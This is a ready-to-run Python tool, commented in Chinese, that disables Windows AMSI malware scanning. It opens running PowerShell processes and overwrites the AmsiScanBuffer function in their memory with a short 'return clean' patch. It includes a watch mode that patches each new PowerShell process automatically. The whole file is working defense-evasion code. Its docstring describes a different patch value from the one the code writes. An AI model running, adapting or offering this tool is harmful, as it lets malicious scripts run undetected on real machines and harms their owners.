#!/usr/bin/env python3
"""
AMSI Patcher — 跨进程内存补丁工具
学习来源: Fluid Attacks "AMSI bypass using Python"
原理: 找到powershell.exe进程 → 定位amsi.dll的AmsiScanBuffer → 
      patch前6字节为 mov eax,0x80070057; ret (AMSI_RESULT_NOT_DETECTED)
用法: python amsi_patcher.py          # 自动patch所有powershell进程
      python amsi_patcher.py --pid 1234  # patch指定PID
      python amsi_patcher.py --watch     # 监控模式，新powershell自动patch
"""
import psutil
from ctypes import *
from ctypes import wintypes
import sys
import time

KERNEL32 = windll.kernel32

# 进程访问权限
PROCESS_ALL_ACCESS = 0x1F0FFF

# AMSI_RESULT_NOT_DETECTED = 1, 对应 patch: mov eax, 1; ret
# 更激进的patch: 直接返回 (xor eax, eax; inc eax; ret)
AMSI_PATCH = (c_ubyte * 6)(0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3)  # mov eax,1; ret

# 另一种知名patch: 使AmsiScanBuffer直接返回0x80070057 (invalid arg)
# AMSI_PATCH = (c_ubyte * 6)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

def find_powershell_pids():
    """获取所有powershell.exe进程的PID"""
    pids = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name']
            if name and name.lower() == 'powershell.exe':
                pids.append(proc.info['pid'])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return pids

def get_module_base_address(process_handle, module_name):
    """从进程的加载模块中找到指定模块的基址"""
    PSAPI = windll.PSAPI
    
    # 先获取需要的缓冲区大小
    cb_needed = wintypes.DWORD(0)
    PSAPI.EnumProcessModules(process_handle, None, 0, byref(cb_needed))
    
    module_count = cb_needed.value // sizeof(wintypes.HMODULE)
    if module_count == 0:
        return None
    
    # 获取所有模块句柄
    modules = (wintypes.HMODULE * module_count)()
    PSAPI.EnumProcessModules(process_handle, modules, sizeof(modules), byref(cb_needed))
    
    for mod in modules:
        mod_name = create_unicode_buffer(260)
        PSAPI.GetModuleBaseNameW(process_handle, mod, mod_name, 260)
        if mod_name.value and mod_name.value.lower() == module_name.lower():
            return mod
    
    return None

def get_proc_address(module_handle, proc_name):
    """从模块句柄获取函数地址（远程进程地址空间中的地址）"""
    return KERNEL32.GetProcAddress(module_handle, proc_name.encode())

def patch_amsi(pid):
    """Patch指定PID进程中的AMSI"""
    try:
        process = psutil.Process(pid)
        
        # 1. 打开进程
        process_handle = KERNEL32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            return f"❌ PID {pid}: 无法打开进程（需要管理员权限）"
        
        # 2. 找到amsi.dll基址
        amsi_module = get_module_base_address(process_handle, "amsi.dll")
        if not amsi_module:
            KERNEL32.CloseHandle(process_handle)
            return f"❌ PID {pid}: amsi.dll未加载"
        
        # 3. 获取AmsiScanBuffer地址
        scan_buffer_addr = get_proc_address(amsi_module, "AmsiScanBuffer")
        if not scan_buffer_addr:
            KERNEL32.CloseHandle(process_handle)
            return f"❌ PID {pid}: 找不到AmsiScanBuffer"
        
        print(f"  AmsiScanBuffer 地址: 0x{scan_buffer_addr:08X}")
        
        # 4. 修改内存保护为RWX
        old_protect = wintypes.DWORD(0)
        result = KERNEL32.VirtualProtectEx(
            process_handle, 
            scan_buffer_addr, 
            sizeof(AMSI_PATCH), 
            0x40,  # PAGE_EXECUTE_READWRITE
            byref(old_protect)
        )
        if not result:
            KERNEL32.CloseHandle(process_handle)
            return f"❌ PID {pid}: VirtualProtectEx失败"
        
        # 5. 写入patch
        bytes_written = wintypes.SIZE_T(0)
        result = KERNEL32.WriteProcessMemory(
            process_handle, 
            scan_buffer_addr, 
            byref(AMSI_PATCH), 
            sizeof(AMSI_PATCH), 
            byref(bytes_written)
        )
        
        # 恢复内存保护
        KERNEL32.VirtualProtectEx(process_handle, scan_buffer_addr, 
                                   sizeof(AMSI_PATCH), old_protect, byref(wintypes.DWORD(0)))
        KERNEL32.CloseHandle(process_handle)
        
        if result and bytes_written.value == sizeof(AMSI_PATCH):
            return f"✅ PID {pid}: AMSI已禁用 ({process.name()})"
        else:
            return f"❌ PID {pid}: WriteProcessMemory失败"
            
    except psutil.NoSuchProcess:
        return f"❌ PID {pid}: 进程已不存在"
    except Exception as e:
        return f"❌ PID {pid}: 错误 - {e}"

def main():
    import argparse
    parser = argparse.ArgumentParser(description="AMSI Patcher - 跨进程禁用Windows Defender AMSI")
    parser.add_argument("--pid", type=int, help="指定要patch的PID")
    parser.add_argument("--watch", action="store_true", help="监控模式，持续检测新powershell进程")
    args = parser.parse_args()
    
    if args.pid:
        # 单进程模式
        result = patch_amsi(args.pid)
        print(result)
    elif args.watch:
        # 监控模式
        print("🛡️ AMSI Patcher 监控模式启动...")
        patched_pids = set()
        while True:
            pids = find_powershell_pids()
            for pid in pids:
                if pid not in patched_pids:
                    result = patch_amsi(pid)
                    print(result)
                    patched_pids.add(pid)
            time.sleep(2)
    else:
        # 自动模式：patch所有现有powershell
        pids = find_powershell_pids()
        if not pids:
            print("没有正在运行的powershell.exe进程")
            return
        
        print(f"发现 {len(pids)} 个powershell进程，开始patch...")
        for pid in pids:
            result = patch_amsi(pid)
            print(result)

if __name__ == "__main__":
    main()